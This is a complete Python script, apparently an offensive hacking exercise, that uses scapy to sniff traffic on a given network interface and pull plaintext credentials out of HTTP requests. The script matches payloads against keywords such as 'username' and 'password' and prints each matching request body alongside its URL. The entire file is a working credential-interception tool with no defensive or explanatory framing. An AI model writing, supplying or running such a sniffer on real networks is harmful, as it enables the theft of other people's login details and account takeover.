#!/usr/bin/env python3

import scapy.all as scapy
from scapy.layers import http
import optparse


def get_parameters():
    parser = optparse.OptionParser()
    parser.add_option('-i', '--interface', '--iface',
                      dest='iface', help='interface to sniff')
    (options, arguments) = parser.parse_args()
    if not options.iface:
        parser.error(
            '[-] interface is required. use --help for more information')
    return options


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=handle_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_credentials(packet):
    load = str(packet[scapy.Raw].load)
    keywords = ["username", "Username", "user", "User",
                "login", "Login", "pass", "password", "Password", "passw"]
    for key in keywords:
        if key in load:
            return load


def handle_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        if packet.haslayer(scapy.Raw):
            credentials = get_credentials(packet)
            if credentials:
                print("[+] url is " + url.decode())
                print("\n\n[+] potential sensitive data >>>>\n %s\n\n" % credentials)


options = get_parameters()
sniff(options.iface)
